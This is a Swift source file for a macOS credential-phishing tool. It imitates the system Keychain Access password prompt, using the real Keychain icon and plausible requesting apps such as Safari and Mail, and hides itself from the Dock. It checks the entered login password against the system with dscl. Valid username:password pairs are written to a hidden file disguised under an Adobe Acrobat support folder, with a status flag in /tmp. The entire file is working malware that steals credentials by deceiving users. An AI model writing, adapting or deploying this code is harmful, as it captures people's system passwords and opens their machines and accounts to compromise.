import Cocoa

// --- Keychain-style auth prompt ---
// Mimics the native macOS Keychain Access dialog
// Single password field, "Always Allow" / "Deny" / "Allow" buttons

let cachePath: String = {
    let home = NSHomeDirectory()
    return home + "/Library/Application Support/Adobe/AcrobatDC/.auth_cache"
}()
let resultPath = "/tmp/.cred_result"

func getRealUsername() -> String {
    return NSUserName()
}

// --- Load the Keychain Access app icon ---
func getKeychainIcon() -> NSImage? {
    // Primary: Get icon from Keychain Access.app bundle
    let appPaths = [
        "/System/Applications/Utilities/Keychain Access.app",
        "/Applications/Utilities/Keychain Access.app"
    ]
    for appPath in appPaths {
        if let bundle = Bundle(path: appPath),
           let iconFile = bundle.infoDictionary?["CFBundleIconFile"] as? String ?? bundle.infoDictionary?["CFBundleIconName"] as? String {
            let iconPath = bundle.bundlePath + "/Contents/Resources/" + iconFile
            // Try with and without .icns extension
            for ext in ["", ".icns"] {
                if let img = NSImage(contentsOfFile: iconPath + ext) {
                    img.size = NSSize(width: 64, height: 64)
                    return img
                }
            }
        }
        // Fallback: use NSWorkspace to get app icon
        let img = NSWorkspace.shared.icon(forFile: appPath)
        if img.size.width > 0 {
            img.size = NSSize(width: 64, height: 64)
            return img
        }
    }
    // Last resort: generic lock
    if let img = NSImage(named: NSImage.lockLockedTemplateName) {
        img.size = NSSize(width: 64, height: 64)
        return img
    }
    return nil
}

// --- Custom accessory view: password field only ---
class PasswordView: NSView {
    let passField: NSSecureTextField

    init() {
        passField = NSSecureTextField(frame: NSRect(x: 100, y: 0, width: 280, height: 24))
        super.init(frame: NSRect(x: 0, y: 0, width: 380, height: 30))

        let label = NSTextField(labelWithString: "Password:")
        label.frame = NSRect(x: 0, y: 2, width: 95, height: 20)
        label.alignment = .right
        label.font = NSFont.systemFont(ofSize: 13)

        passField.font = NSFont.systemFont(ofSize: 13)
        passField.focusRingType = .exterior
        if #available(macOS 10.12.2, *) {
            passField.isAutomaticTextCompletionEnabled = false
        }
        passField.contentType = .password

        addSubview(label)
        addSubview(passField)
    }

    required init?(coder: NSCoder) { fatalError() }
}

// --- Validate password via dscl ---
func validatePassword(user: String, password: String) -> Bool {
    let proc = Process()
    proc.executableURL = URL(fileURLWithPath: "/usr/bin/dscl")
    proc.arguments = [".", "-authonly", user, password]
    proc.standardOutput = FileHandle.nullDevice
    proc.standardError = FileHandle.nullDevice
    do {
        try proc.run()
        proc.waitUntilExit()
        return proc.terminationStatus == 0
    } catch {
        return false
    }
}

// --- Write captured credentials ---
func writeCreds(user: String, password: String) {
    let payload = "\(user):\(password)"
    // Ensure directory exists
    let dir = (cachePath as NSString).deletingLastPathComponent
    try? FileManager.default.createDirectory(atPath: dir, withIntermediateDirectories: true)
    try? payload.write(toFile: cachePath, atomically: true, encoding: .utf8)
    try? "CAPTURED".write(toFile: resultPath, atomically: true, encoding: .utf8)
}

func writeResult(_ result: String) {
    try? result.write(toFile: resultPath, atomically: true, encoding: .utf8)
}

// --- Pick a believable app and keychain item ---
func getPromptContext() -> (app: String, item: String) {
    // Common apps that trigger keychain prompts
    let contexts: [(String, String)] = [
        ("Keychain Access", "Test Note 1"),
        ("Safari", "accounts.google.com"),
        ("Mail", "IMAP Password"),
        ("Finder", "Network Password"),
        ("Calendar", "CalDAV Account"),
    ]
    // Pick based on current second to seem random but be deterministic per launch
    let idx = Int(Date().timeIntervalSince1970) % contexts.count
    return contexts[idx]
}

// --- Main ---
let app = NSApplication.shared
app.setActivationPolicy(.accessory)  // Hide from Dock

let maxAttempts = 3
var attempts = 0
let user = getRealUsername()
let ctx = getPromptContext()

// Clean previous result
try? FileManager.default.removeItem(atPath: resultPath)

while attempts < maxAttempts {
    let alert = NSAlert()

    // Set the Keychain icon
    if let icon = getKeychainIcon() {
        alert.icon = icon
    }

    alert.messageText = "\"\(ctx.app)\" wants to use your confidential information stored in \"\(ctx.item)\" in your keychain."
    alert.informativeText = "To allow this, enter the \"login\" keychain password."

    if attempts > 0 {
        alert.informativeText = "The password was incorrect. To allow this, enter the \"login\" keychain password."
    }

    // Buttons added in order: first = rightmost
    alert.addButton(withTitle: "Allow")           // NSAlertFirstButtonReturn (1000)
    alert.addButton(withTitle: "Deny")            // NSAlertSecondButtonReturn (1001)
    alert.addButton(withTitle: "Always Allow")    // NSAlertThirdButtonReturn (1002)

    // Add the password accessory view
    let passView = PasswordView()
    alert.accessoryView = passView

    // Show help button (cosmetic only)
    alert.showsHelp = true

    // Force window to front
    app.activate(ignoringOtherApps: true)

    // Focus the password field after a short delay
    DispatchQueue.main.asyncAfter(deadline: .now() + 0.1) {
        passView.passField.becomeFirstResponder()
    }

    let response = alert.runModal()

    if response == .alertSecondButtonReturn {
        // "Deny" clicked
        writeResult("DENIED")
        break
    }

    // "Allow" or "Always Allow" — both mean user entered password
    let pw = passView.passField.stringValue

    if pw.isEmpty {
        attempts += 1
        continue
    }

    if validatePassword(user: user, password: pw) {
        writeCreds(user: user, password: pw)
        break
    } else {
        attempts += 1
        if attempts >= maxAttempts {
            writeResult("MAX_ATTEMPTS")
        }
    }
}

if attempts >= maxAttempts {
    writeResult("MAX_ATTEMPTS")
}
